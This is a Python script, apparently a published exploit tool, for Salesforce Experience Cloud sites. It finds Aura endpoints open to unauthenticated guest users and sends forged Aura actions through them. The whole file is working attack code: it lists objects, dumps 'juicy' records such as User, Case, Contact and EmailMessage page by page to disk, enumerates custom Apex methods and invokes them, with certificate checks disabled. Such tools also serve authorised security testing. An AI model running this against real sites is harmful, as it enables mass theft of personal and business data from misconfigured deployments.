import urllib.request
import urllib.parse
from urllib.error import URLError, HTTPError
import json
from json import JSONDecodeError
import argparse
import re
import os
import sys
import ssl

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE

AURA_PATH_PATTERN = ("aura", "s/aura", "s/sfsites/aura", "sfsites/aura")


SF_OBJECT_NAME = (
    "Case",
    "Account",
    "User",
    "Contact",
    "Document",
    "ContentDocument",
    "ContentVersion",
    "ContentBody",
    "CaseComment",
    "Note",
    "Employee",
    "Attachment",
    "EmailMessage",
    "CaseExternalDocument",
    "Attachment",
    "Lead",
    "Name",
    "EmailTemplate",
    "EmailMessageRelation",
)

EXCLUDED_COMPONENT_NAMESPACES = (
    "aura",
    "ui",
    "force",
    "lightning",
    "selfService",
    "community_reputation",
    "community_topic",
    "interop",
    "community_runtime",
    "runtime_sales_activities",
    " runtime_service_omnichannel",
    "opencti",
    "runtime_sales_pipelineboard",
    "offline",
    "sfa",
    "omni",
    "one",
    "desktopDashboards",
    "native",
    "setup",
    "reports",
    "runtime_online_sales",
    "runtime_essential_checkout",
    "runtime_search_federated",
)

DEFAULT_PAGE_SIZE = 100
MAX_PAGE_SIZE = 1000
DEFAULT_PAGE = 1

USER_AGENT = "Mozilla/5.0 (Macintosh; Intel Mac OS X 11_2_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36"


def http_request(url, values="", method="GET"):
    headers = {"User-Agent": USER_AGENT}
    if method == "POST":
        headers["Content-Type"] = "application/x-www-form-urlencoded"
        data = urllib.parse.urlencode(values)
        data = data.encode("ascii")
        request = urllib.request.Request(url, data=data, method=method, headers=headers)
    else:
        request = urllib.request.Request(url, method=method, headers=headers)

    response_body = ""
    try:
        with urllib.request.urlopen(request, context=ctx) as response:
            response_body = response.read().decode("utf-8")
    except URLError as e:
        raise
    return response_body


def check(url):
    aura_endpoints = []
    for path in AURA_PATH_PATTERN:
        tmp_aura_endpoint = urllib.parse.urljoin(url, path)

        try:
            response_body = http_request(tmp_aura_endpoint, values={}, method="POST")
        except HTTPError as e:
            response_body = e.read().decode("utf-8")

        if "aura:invalidSession" in response_body:
            aura_endpoints.append(tmp_aura_endpoint)

    return aura_endpoints


def get_aura_endpoint_config(url):
    response_body = ""
    try:
        response_body = http_request(url)
    except Exception as e:
        print("[-] Failed to access the url")
        raise

    if ("window.location.href ='%s" % url) in response_body:
        location_url = re.search(r"window.location.href =\'([^\']+)", response_body)
        url = location_url.group(1)
        try:
            response_body = http_request(url)
        except Exception as e:
            print("[-] Failed to access the redirect url")
            raise

    urlencoded_aura_endpoints = re.search(
        r"\/s\/sfsites\/l\/([^\/]+fwuid[^\/]+)", response_body
    )

    aura_endpoint_details = {}
    if urlencoded_aura_endpoints is not None:
        aura_endpoint_details = json.loads(
            urllib.parse.unquote(urlencoded_aura_endpoints.group(1))
        )

    fwuid = aura_endpoint_details["fwuid"]
    app = aura_endpoint_details["app"]
    markup = aura_endpoint_details["loaded"]

    if fwuid is None or markup is None or app is None:
        raise Exception("Couldn't find fwuid or markup")

    aura_endpoint_config = {}
    aura_endpoint_config["mode"] = "PROD"
    aura_endpoint_config["fwuid"] = fwuid
    aura_endpoint_config["app"] = app
    aura_endpoint_config["loaded"] = markup
    aura_endpoint_config["dn"] = []
    aura_endpoint_config["globals"] = {}
    aura_endpoint_config["uad"] = False

    return aura_endpoint_config


def get_experience_routes(url):
    print("[+] Get Experience Routes")
    extractScriptTagsPattern = R"<script([^>]*)?>.*?</script>"

    response_body = ""
    try:
        response_body = http_request(url)
    except Exception as e:
        print("[-] Failed to access the url")
        raise

    if ("window.location.href ='%s" % url) in response_body:
        location_url = re.search(r"window.location.href =\'([^\']+)", response_body)
        url = location_url.group(1)
        try:
            response_body = http_request(url)
        except Exception as e:
            print("[-] Failed to access the redirect url")
            raise

    srcFromLastScriptTag = (
        re.findall(extractScriptTagsPattern, response_body)[-1]
        .replace('src="', "")
        .replace('"', "")
        .replace(" ", "")
    )
    parsedUrl = urllib.parse.urlsplit(url)
    jsurl = parsedUrl.scheme + "://" + parsedUrl.netloc + srcFromLastScriptTag

    print("[+] Follow Bootstrap Url")

    try:
        js_response_body = http_request(jsurl)
    except Exception as e:
        print("[-] Failed to access the js url")
        raise

    aura_attributes = response_body.split("bootstrap.js?aura.attributes=")[1]
    aura_attributes = aura_attributes.split('">')[0]
    aura_attributes = json.loads(urllib.parse.unquote(aura_attributes))

    view_details_pattern = R'routes":\{.+?,\s?.+?\}\s?\}'

    js_response_body = js_response_body.replace("\n", "")
    js_response_body = " ".join(js_response_body.split())
    view_details = re.search(view_details_pattern, js_response_body)
    routes_json = view_details.group().replace('routes":', "")
    routes_map = json.loads(routes_json)

    # print(json.dumps(routes_map, indent=4))

    routes = []
    for key, value in routes_map.items():
        routes.append(
            dict(
                path=key,
                id=value["id"],
                event=value["event"],
                route_uddid=value["route_uddid"],
                view_uuid=value["view_uuid"],
                themeLayoutType=aura_attributes["themeLayoutType"],
                publishedChangelistNum=aura_attributes["publishedChangelistNum"],
                brandingSetId=aura_attributes["brandingSetId"],
            )
        )

    return routes


def create_payload_for_getCustomComponents(route):
    payload = load_payload_json_from_file("ACTION$getPageComponent.json")
    payload["actions"][0]["params"]["attributes"]["viewId"] = route["id"]
    payload["actions"][0]["params"]["attributes"]["routeType"] = route["event"]
    payload["actions"][0]["params"]["attributes"]["themeLayoutType"] = route[
        "themeLayoutType"
    ]
    payload["actions"][0]["params"]["attributes"]["params"]["viewid"] = route[
        "view_uuid"
    ]
    payload["actions"][0]["params"]["publishedChangelistNum"] = route[
        "publishedChangelistNum"
    ]
    payload["actions"][0]["params"]["brandingSetId"] = route["brandingSetId"]
    return payload


def create_payload_for_callApex(namespace, controller_name, method_name, params):
    payload = load_payload_json_from_file("ACTION$executeApexMethod.json")
    payload["actions"][0]["descriptor"] = "apex://%s.%s/ACTION$%s" % (
        namespace,
        controller_name,
        method_name,
    )
    payload["actions"][0]["params"] = params

    return payload


def create_payload_for_getItems(object_name, page_size, page):
    payload = load_payload_json_from_file("ACTION$getItems.json")
    payload["actions"][0]["params"]["entityNameOrId"] = object_name
    payload["actions"][0]["params"]["pageSize"] = page_size
    payload["actions"][0]["params"]["currentPage"] = page
    return payload


def create_payload_for_getRecord(record_id):
    payload = load_payload_json_from_file("ACTION$getRecord.json")
    payload["params"]["recordId"] = record_id
    return payload


def fake_request(aura_endpoint_url, payload, aura_endpoint_config):
    url = aura_endpoint_url

    values = {
        "message": payload,
        "aura.context": aura_endpoint_config,
        "aura.token": "undefined",
    }

    try:
        response_body = http_request(url, values=values, method="POST")
        response_json = json.loads(response_body)
    except JSONDecodeError as je:
        raise Exception("JSON Decode error. Response -> %s" % response_body)
    except Exception as e:
        raise e

    return response_json


def pull_custom_component_list(url, aura_endpoint, aura_endpoint_config):
    print("[+] Pulling Custom Component List")

    routes = get_experience_routes(url)

    custom_components = []
    for route in routes:
        payload = create_payload_for_getCustomComponents(route)
        # print(payload)
        result = fake_request(aura_endpoint, json.dumps(payload), aura_endpoint_config)

        if result.get("actions")[0].get("state") != "SUCCESS":
            print("[-] Aura Action to get Component Definitions had an error. Aborting")
            return []

        all_components = find_componentdescriptors(result)

        for cmp in all_components:
            if (
                not any(x in cmp for x in EXCLUDED_COMPONENT_NAMESPACES)
                and cmp not in custom_components
            ):
                custom_components.append(cmp)

    return custom_components


def pull_custom_components_with_apex_methods(url, aura_endpoint, aura_endpoint_config):
    print("[+] Extracting Apex Methods from Custom Components")
    custom_components = pull_custom_component_list(
        url, aura_endpoint, aura_endpoint_config
    )

    components_with_apex = []

    for component_name in custom_components:
        payload = load_payload_json_from_file("ACTION$getComponentDef.json")
        payload["actions"][0]["params"]["name"] = component_name
        result = fake_request(aura_endpoint, json.dumps(payload), aura_endpoint_config)

        if result.get("actions")[0].get("state") != "SUCCESS":
            print("[-] Failed to get component definition for %s" % component_name)
            continue

        is_aura_component = "context" in result and "componentDefs" in result["context"]
        is_lwc_component = "lri" in result["actions"][0]["returnValue"]

        component_details = {}

        if is_aura_component:
            for cmp in result["context"]["componentDefs"]:
                if "cd" in cmp and "ac" in cmp["cd"]:
                    component_details.update(
                        component_name=component_name,
                        namespace=component_name.split(":")[0],
                        type="Aura",
                    )
                    component_details["methods"] = []
                    for details in cmp["cd"]["ac"]:
                        if details["descriptor"].startswith("apex://"):
                            classname = re.search(
                                "apex:\/\/(\w+)\/", details["descriptor"]
                            ).group(1)
                            component_details["methods"].append(
                                dict(
                                    classname=classname,
                                    methodname=details["n"],
                                    descriptor=details["descriptor"],
                                    params=details["pa"],
                                )
                            )
                    components_with_apex.append(component_details)

        elif is_lwc_component:
            lwc_details = result["actions"][0]["returnValue"]["lri"]
            append = False
            component_details["methods"] = []
            for key, value in lwc_details.items():
                if value == "apexMethod":
                    append = True
                    component_details["methods"].append(
                        dict(
                            classname=key.split(".")[0],
                            methodname=key.split(".")[1],
                            descriptor="apex://%s/$ACTION$%s"
                            % (key.split(".")[0], key.split(".")[1]),
                            params=["UNKNOWN"],
                        )
                    )
            if append:
                component_details.update(
                    component_name=component_name,
                    namespace=component_name.split(":")[0],
                    type="LWC",
                )
                components_with_apex.append(component_details)

    return components_with_apex


def find_componentdescriptors(result):
    descriptors = []
    for key, value in result.items():
        if key == "descriptor" and value.startswith("markup://"):
            descriptors.append(value.replace("markup://", ""))
        elif isinstance(value, dict):
            descriptors.extend(find_componentdescriptors(value))
        elif isinstance(value, list):
            for item in value:
                if isinstance(item, dict):
                    descriptors.extend(find_componentdescriptors(item))
    return set(descriptors)


def print_apex_methods(url, aura_endpoint, aura_endpoint_config):
    custom_components = pull_custom_components_with_apex_methods(
        url, aura_endpoint, aura_endpoint_config
    )

    if len(custom_components) == 0:
        print("[-] No custom components with Apex found")
    else:
        print("[+] Printing Custom Component List with Apex Methods")

    for cmp in custom_components:
        print("    %s [%s]" % (cmp["component_name"], cmp["type"]))
        for method in cmp["methods"]:
            params = ""
            for param in method["params"]:
                if param == "UNKNOWN":
                    params = "???"
                    continue
                params += "%s %s, " % (
                    param["type"].replace("apex://", ""),
                    param["name"],
                )
            params = params[0:-2]
            print(
                "        %s.%s(%s)"
                % (method["classname"], method["methodname"], params)
            )


def pull_object_list(aura_endpoint, aura_endpoint_config):
    print("[+] Pull the object list")
    sf_all_object_name_list = []
    payload = load_payload_json_from_file("ACTION$getConfigData.json")

    try:
        response = fake_request(
            aura_endpoint, json.dumps(payload), aura_endpoint_config
        )

        if (
            response.get("exceptionEvent") is not None
            and response.get("exceptionEvent") is True
        ):
            raise Exception(response)

        if (
            response.get("actions") is None
            or response.get("actions")[0].get("state") is None
        ):
            raise Exception("Failed to get actions: %s" % response)

        SF_OBJECT_NAME_dict = (
            response.get("actions")[0].get("returnValue").get("apiNamesToKeyPrefixes")
        )

        SF_OBJECT_NAME_list = [
            key for key in SF_OBJECT_NAME_dict.keys() if not key.endswith("__c")
        ]
        sf_custom_object_name = [
            key for key in SF_OBJECT_NAME_dict.keys() if key.endswith("__c")
        ]
        sf_all_object_name_list = [key for key in SF_OBJECT_NAME_dict.keys()]

    except Exception as e:
        print("[-] Failed to pull the object list.")
        print("[-] Error: %s" % e)

    else:
        print("[+] Default object list")
        print(SF_OBJECT_NAME_list)
        print("[+] Custom object list")
        print(sf_custom_object_name)

    return sf_all_object_name_list


def dump_record(aura_endpoint, aura_endpoint_config, record_id):
    print("[+] Dumping the record")
    payload = create_payload_for_getRecord(args.record_id)

    try:
        response = fake_request(aura_endpoint, payload, aura_endpoint_config)

    except Exception as e:
        print("[-] Failed to dump the record.")
        return None

    if response.get("actions")[0].get("state") != "SUCCESS":
        return None

    print("[+] State: %s" % response.get("actions")[0].get("state"))
    print("[+] Record result: ")
    print(
        json.dumps(
            response.get("actions")[0].get("returnValue"), ensure_ascii=False, indent=2
        )
    )


def dump_object(
    aura_endpoint,
    aura_endpoint_config,
    object_name,
    page_size=DEFAULT_PAGE_SIZE,
    page=DEFAULT_PAGE,
):
    print('[+] Getting "%s" object (page number %s)...' % (object_name, page))
    payload = create_payload_for_getItems(object_name, page_size, page)

    try:
        response = fake_request(
            aura_endpoint, json.dumps(payload), aura_endpoint_config
        )

        if (
            response.get("exceptionEvent") is not None
            and response.get("exceptionEvent") is True
        ):
            raise Exception(response)

    except Exception as e:
        print("[-] Failed to exploit.")
        print("[-] Error: %s" % e)
        return None

    try:
        actions = response.get("actions")[0]
        state = response.get("actions")[0].get("state")
    except:
        return None

    return_value = actions.get("returnValue")
    try:
        total_count = return_value.get("totalCount")
        result_count = return_value.get("result")
    except:
        total_count = "None"
        result_count = []
    print(
        "[+] State: %s, Total: %s, Page: %s, Result count: %s"
        % (state, total_count, page, len(result_count))
    )
    if state == "ERROR":
        print("[+] Error message: %s" % actions.get("error")[0])

    return response


def dump_and_save_objects(aura_endpoint, aura_endpoint_config, output_dir, flag_full):
    sf_all_object_name_list = pull_object_list(aura_endpoint, aura_endpoint_config)

    if flag_full:
        page_size = MAX_PAGE_SIZE
    else:
        page_size = DEFAULT_PAGE_SIZE

    failed_object = []
    dumped_object_count = 0
    for object_name in sf_all_object_name_list:
        page = DEFAULT_PAGE

        while True:
            response = dump_object(
                aura_endpoint, aura_endpoint_config, object_name, page_size, page
            )

            if response is None:
                failed_object.append(object_name)
                break

            return_value = response.get("actions")[0].get("returnValue")

            file_path = os.path.join(
                output_dir, "%s__page%s.json" % (object_name, page)
            )
            with open(file_path, "w", encoding="utf_8") as fw:
                try:
                    fw.write(json.dumps(return_value, ensure_ascii=False, indent=2))
                    dumped_object_count += 1
                except Exception as e:
                    failed_object.append(object_name)
            page += 1

            if (
                flag_full is False
                or return_value is None
                or return_value.get("result") is None
            ):
                break
            if len(return_value.get("result")) < page_size:
                break

    if len(failed_object) > 0:
        print(
            "[-] Failed to dump '%s' object. Please try manually with -o option."
            % ", ".join(failed_object)
        )

    if dumped_object_count > (len(sf_all_object_name_list) / 2):
        return True
    else:
        return False


def execute_apex():
    print("[+] Execute Apex")

    # TODO: need to edit details manually for now
    namespace = "c"
    controller_name = "NextEventCtrl"
    method_name = "query"
    params = dict(sObjectName="Account", fieldList="Name,Industry,Website")

    payload = create_payload_for_callApex(
        namespace, controller_name, method_name, params
    )

    print(
        "[+] Calling %s.%s with %s in namespace %s"
        % (controller_name, method_name, params, namespace)
    )

    result = fake_request(aura_endpoint, json.dumps(payload), aura_endpoint_config)
    if result["actions"][0]["state"] == "SUCCESS":
        result["performance-details"] = result["perfSummary"]
    return result


def load_payload_json_from_file(filename):
    with open(filename, "r") as f:
        payload = json.load(f)
    return payload


def parse_command_line_args():
    parser = argparse.ArgumentParser(
        description="Exploit Salesforce through the aura endpoint with the guest privilege"
    )
    parser.add_argument(
        "-u", "--url", required=True, help="set the SITE url. e.g. http://url/site_path"
    )
    parser.add_argument(
        "-o",
        "--objects",
        help='set the object name. Default value is "User" object. Juicy Objects: %s'
        % ",".join(SF_OBJECT_NAME),
        nargs="*",
        default=["User"],
    )
    parser.add_argument(
        "-l", "--listobj", help="pull the object list.", action="store_true"
    )
    parser.add_argument(
        "-c", "--check", help="only check aura endpoint", action="store_true"
    )
    parser.add_argument(
        "-a", "--aura_endpoint_config", help="set your valid aura_endpoint_config"
    )
    parser.add_argument(
        "-r", "--record_id", help="set the recode id to dump the record"
    )
    parser.add_argument(
        "-d",
        "--dump_objects",
        help="dump a small number of objects accessible to guest users and saves them in the file.",
        action="store_true",
    )
    parser.add_argument(
        "-f",
        "--full",
        help="if set with -d, dump all pages of objects.",
        action="store_true",
    )
    parser.add_argument(
        "-s",
        "--skip",
        help="if set with -d, skip the objects already dumped.",
        action="store_true",
    )
    parser.add_argument(
        "-p",
        "--pull_custom_components",
        help="if set will load component definitions",
        action="store_true",
    )
    parser.add_argument(
        "-e",
        "--extract_apex_methods",
        help="Extracts Apex methods from custom components",
        action="store_true",
    )
    parser.add_argument(
        "-x",
        "--execute_apex",
        help="Calls an Apex Method. Details must be changed in exploit.py for now",
        action="store_true",
    )

    args = parser.parse_args()

    return args


if __name__ == "__main__":
    args = parse_command_line_args()

    # aura_endpoint
    print("[+] Looking for aura endpoint and check vulnerability")
    aura_endpoints = check(args.url)

    if len(aura_endpoints) == 0:
        print("[-] Url doesn't seems to be vulnerable")
        sys.exit(0)
    else:
        print("[+] %s seems to be vulnerable." % (aura_endpoints))

    if args.check:
        sys.exit(0)

    print("[+] Start exploit")

    if args.aura_endpoint_config is not None and len(args.aura_endpoint_config) > 1:
        aura_endpoint_config = args.aura_endpoint_config
    else:
        try:
            aura_endpoint_config = json.dumps(get_aura_endpoint_config(args.url))
        except Exception as e:
            print("[-] Failed to get aura context.")
            sys.exit(0)

    result = False
    for aura_endpoint in aura_endpoints:
        print("-----")
        print("[+] Endpoint: %s" % aura_endpoint)

        if args.listobj:
            sf_all_object_name_list = pull_object_list(
                aura_endpoint, aura_endpoint_config
            )

        elif args.pull_custom_components:
            custom_components = pull_custom_component_list(
                args.url, aura_endpoint, aura_endpoint_config
            )

            if len(custom_components) == 0:
                print("[-] No custom components found")
            else:
                print("[+] Found Custom Components")
                for cmp in custom_components:
                    print(json.dumps(cmp, indent=4))

        elif args.extract_apex_methods:
            print_apex_methods(args.url, aura_endpoint, aura_endpoint_config)

        elif args.execute_apex:
            print(json.dumps(execute_apex(), indent=4))

        elif args.record_id:
            dump_record(aura_endpoint, aura_endpoint_config, args.record_id)

        elif args.dump_objects:
            if result and args.skip:
                print("[+] Skip to dump")
                continue

            url = urllib.parse.urlparse(args.url)
            urlpath = url.path.replace("/", "_")
            urlnetloc = url.netloc.replace(":", "_")
            output_dir = os.path.join(
                os.getcwd(), url.scheme + "_" + urlnetloc + "_" + urlpath
            )
            os.makedirs(output_dir, exist_ok=True)
            result = dump_and_save_objects(
                aura_endpoint, aura_endpoint_config, output_dir, args.full
            )

        elif args.objects:
            for object_name in args.objects:
                response = dump_object(aura_endpoint, aura_endpoint_config, object_name)
                if response is None:
                    continue

                return_value = response.get("actions")[0].get("returnValue")
                print("[+] Result: ")
                print(json.dumps(return_value, ensure_ascii=False, indent=2))
